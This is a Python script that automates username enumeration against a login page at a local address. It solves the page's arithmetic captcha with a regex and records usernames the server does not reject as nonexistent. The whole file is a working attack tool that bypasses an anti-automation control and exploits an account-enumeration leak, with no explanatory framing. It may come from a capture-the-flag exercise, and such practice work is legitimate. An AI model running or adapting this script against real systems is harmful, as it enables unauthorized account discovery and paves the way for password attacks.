import re
import requests
import time

url = "http://192.168.1.1/login" #target URL
file_path = "" #path to usernames.txt

payload_template = {
    "username": "",
    "password": "a",
    "captcha": ""
}

def solve_captcha(num1, num2, operator):
    if operator == '+':
        return num1 + num2
    elif operator == '-':
        return num1 - num2
    elif operator == '*':
        return num1 * num2
    elif operator == '/':
        return num1 / num2

def main():
    with open(file_path, 'r') as file:
        for idx, name in enumerate(file, start=1):
            name = name.strip()

            # Send initial packet to get captcha
            response1 = requests.post(url, data=payload_template)
            captcha = re.search(r'(\d+)\s*([+\-*/])\s*(\d+)', response1.text)

            if captcha:
                num1, operator, num2 = captcha.groups()

                print(f"Processing name: {name}")
                print(f"Attempt: {idx}")
                print(f"Captcha: {num1} {operator} {num2}")

                # Solve the captcha
                try:
                    result = solve_captcha(int(num1), int(num2), operator)
                    print(f"Solved Captcha: {result}")

                    # Update payload with solved captcha
                    payload_template["username"] = name
                    payload_template["captcha"] = str(result)

                    # Send packet to check if user exists
                    response2 = requests.post(url, data=payload_template)

                    if "Invalid captcha" not in response2.text:
                        if "does not exist" not in response2.text:
                            # User exists, store in exist.log file
                            with open("exist.log", "a") as exist_file:
                                exist_file.write(name + "\n")
                            print("Captcha solved correctly. User exists.")
                        else:
                            print("Captcha solved correctly. User does not exist.")
                    else:
                        print("Error: Invalid captcha")

                    # Add a 0.5-second delay before the next iteration
                    time.sleep(0.2)

                except ValueError:
                    print("Error: Invalid captcha")

            else:
                print("Error: Failed to retrieve captcha")

if __name__ == "__main__":
    main()
